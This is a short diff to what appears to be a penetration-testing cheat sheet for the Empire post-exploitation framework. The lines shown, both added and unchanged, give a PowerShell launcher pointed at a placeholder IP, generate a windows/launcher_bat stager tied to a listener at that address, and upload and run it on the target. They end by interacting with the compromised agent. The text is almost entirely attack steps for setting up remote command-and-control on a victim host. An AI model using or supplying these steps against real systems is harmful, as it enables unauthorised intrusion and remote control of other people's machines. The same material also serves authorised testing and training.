@@ -463,6 +463,13 @@ execute
 
 launcher powershell INSERTIPADDRESS
 
+Copy and paste output in terminal
+***If you need a stager***
+usestager windows/launcher_bat (or whatever can run on host)
+set Listener INSERTIPADDRESS
+generate 
+Upload and run payload
+
 Once you get a connection
 agents
 interact <agent_name>
